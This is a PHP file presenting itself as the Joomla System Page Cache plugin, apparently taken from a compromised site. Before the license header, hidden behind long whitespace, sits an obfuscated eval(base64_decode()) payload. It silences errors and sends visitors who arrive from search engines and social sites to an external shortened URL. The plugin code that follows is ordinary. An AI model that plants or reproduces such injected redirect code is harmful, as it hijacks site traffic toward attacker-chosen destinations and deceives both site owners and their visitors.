<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: cache.php 14401 2010-01-26 14:10:00Z louis $
* @package		Joomla
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

jimport( 'joomla.plugin.plugin' );

/**
 * Joomla! Page Cache Plugin
 *
 * @package		Joomla
 * @subpackage	System
 */
class  plgSystemCache extends JPlugin
{

	var $_cache = null;

	/**
	 * Constructor
	 *
	 * For php4 compatability we must not use the __constructor as a constructor for plugins
	 * because func_get_args ( void ) returns a copy of all passed arguments NOT references.
	 * This causes problems with cross-referencing necessary for the observer design pattern.
	 *
	 * @access	protected
	 * @param	object	$subject The object to observe
	 * @param 	array   $config  An array that holds the plugin configuration
	 * @since	1.0
	 */
	function plgSystemCache(& $subject, $config)
	{
		parent::__construct($subject, $config);

		//Set the language in the class
		$config =& JFactory::getConfig();
		$options = array(
			'cachebase' 	=> JPATH_BASE.DS.'cache',
			'defaultgroup' 	=> 'page',
			'lifetime' 		=> $this->params->get('cachetime', 15) * 60,
			'browsercache'	=> $this->params->get('browsercache', false),
			'caching'		=> false,
			'language'		=> $config->getValue('config.language', 'en-GB')
		);

		jimport('joomla.cache.cache');
		$this->_cache =& JCache::getInstance( 'page', $options );
	}

	/**
	* Converting the site URL to fit to the HTTP request
	*
	*/
	function onAfterInitialise()
	{
		global $mainframe, $_PROFILER;
		$user = &JFactory::getUser();

		if($mainframe->isAdmin() || JDEBUG) {
			return;
		}

		if (!$user->get('aid') && $_SERVER['REQUEST_METHOD'] == 'GET') {
			$this->_cache->setCaching(true);
		}

		$data  = $this->_cache->get();

		if($data !== false)
		{
			// the following code searches for a token in the cached page and replaces it with the
			// proper token.
			$token	= JUtility::getToken();
			$search = '#<input type="hidden" name="[0-9a-f]{32}" value="1" />#';
			$replacement = '<input type="hidden" name="'.$token.'" value="1" />';
			$data = preg_replace( $search, $replacement, $data );

			JResponse::setBody($data);

			echo JResponse::toString($mainframe->getCfg('gzip'));

			if(JDEBUG)
			{
				$_PROFILER->mark('afterCache');
				echo implode( '', $_PROFILER->getBuffer());
			}

			$mainframe->close();
		}
	}

	function onAfterRender()
	{
		global $mainframe;

		if($mainframe->isAdmin() || JDEBUG) {
			return;
		}

		$user =& JFactory::getUser();
		if(!$user->get('aid')) {
			//We need to check again here, because auto-login plugins have not been fired before the first aid check
			$this->_cache->store();
		}
	}
}
